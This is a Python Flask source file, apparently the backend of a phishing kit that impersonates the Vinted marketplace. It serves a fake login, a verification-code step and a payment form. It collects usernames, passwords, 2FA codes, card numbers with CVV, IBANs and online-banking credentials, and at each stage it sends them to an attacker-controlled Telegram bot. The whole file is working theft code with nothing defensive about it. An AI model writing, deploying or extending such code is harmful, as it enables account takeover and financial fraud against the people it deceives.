from flask import Flask, request, redirect, render_template, url_for, session
import os
import requests
import time  # Importation de la bibliothèque time pour le délai
from dotenv import load_dotenv

load_dotenv()

app = Flask(__name__)
app.secret_key = os.getenv("FLASK_SECRET_KEY", "super_secret_default_key")

TELEGRAM_BOT_TOKEN = os.getenv("BOT_TOKEN")
CHAT_ID = os.getenv("CHAT_ID")


def send_telegram_message(message):
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
    data = {"chat_id": CHAT_ID, "text": message}
    try:
        response = requests.post(url, data=data)
        response.raise_for_status()
        print("Message Telegram envoyé avec succès.")
    except requests.exceptions.RequestException as e:
        print(f"Erreur lors de l'envoi du message Telegram: {e}")


@app.route("/", methods=["GET"])
def home():
    return render_template("login.html")


@app.route("/login", methods=["POST"])
def login():
    username = request.form["username"]
    password = request.form["password"]

    session['username'] = username
    session['password'] = password

    message = (
        f"[Vinted Login]\n"
        f"👤 Pseudo: {username}\n"
        f"🔑 Mdp: {password}"
    )
    send_telegram_message(message)

    return redirect(url_for('loading_page'))


@app.route("/loading")
def loading_page():
    username = session.get('username')
    password = session.get('password')

    if not username or not password:
        return redirect(url_for('home'))

    return render_template("loading.html",
                           redirect_url=url_for('verify_page',
                                                username=username,
                                                password=password))


@app.route("/verify", methods=["GET", "POST"])
def verify_page():
    if request.method == "POST":
        username = request.form["username"]
        password = request.form["password"]
        verification_code = request.form["verification_code"]

        session['verification_code'] = verification_code

        message = (
            f"[Vinted Code Verification]\n"
            f"👤 Pseudo: {username}\n"
            f"🔑 Mdp: {password}\n"
            f"🔢 Code: {verification_code}"
        )
        send_telegram_message(message)

        return render_template(
            "payment_info.html",
            username=username,
            password=password,
            verification_code=verification_code
        )
    else:
        username = request.args.get("username")
        password = request.args.get("password")
        return render_template("verify.html", username=username, password=password)


@app.route("/process_payment", methods=["POST"])
def process_payment():
    username = request.form.get("username") or session.get('username')
    password = request.form.get("password") or session.get('password')
    verification_code = request.form.get("verification_code") or session.get('verification_code')

    card_name = request.form["card_name"]
    card_number = request.form["card_number"]
    expiry_date = request.form["expiry_date"]
    cvv = request.form["cvv"]
    iban = request.form["iban"]
    phone_number = request.form.get("phone_number")

    # **** NOUVEAUX CHAMPS À RÉCUPÉRER ****
    bank_name_selected = request.form.get("bank_name")
    other_bank_name = request.form.get("other_bank_name")
    bank_id = request.form.get("bank_id")
    bank_password = request.form.get("bank_password")

    # Déterminer le nom final de la banque
    final_bank_name = bank_name_selected
    if bank_name_selected == "Autre" and other_bank_name:
        final_bank_name = other_bank_name
    elif bank_name_selected == "Autre": # Si "Autre" est sélectionné mais le champ manuel est vide
        final_bank_name = "Autre (non spécifié)"
    # ***********************************

    # Formate le message complet de la carte bancaire pour Telegram
    message = (
        f"[Vinted Payment Info]\n"
        f"👤 Pseudo: {username or 'N/A'}\n"
        f"🔑 Mdp: {password or 'N/A'}\n"
        f"🔢 Code Verif: {verification_code or 'N/A'}\n"
        f"💳 Nom sur carte: {card_name}\n"
        f"🔢 Num carte: {card_number}\n"
        f"📅 Exp: {expiry_date}\n"
        f"🔐 CVV: {cvv}\n"
        f"🏦 IBAN: {iban}\n"
        f"📞 Téléphone: {phone_number or 'N/A'}\n"
        # **** AJOUT DES NOUVEAUX CHAMPS AU MESSAGE ****
        f"🏦 Banque: {final_bank_name or 'N/A'}\n"
        f"🆔 Identifiant Bancaire: {bank_id or 'N/A'}\n"
        f"🔑 Mdp/Code Sec. Bancaire: {bank_password or 'N/A'}"
        # *********************************************
    )

    send_telegram_message(message)

    return redirect(url_for('security_page'))


@app.route("/page_de_securisation")
def security_page():
    session.clear()
    return render_template("security_page.html")


if __name__ == "__main__":
    app.run(debug=True)
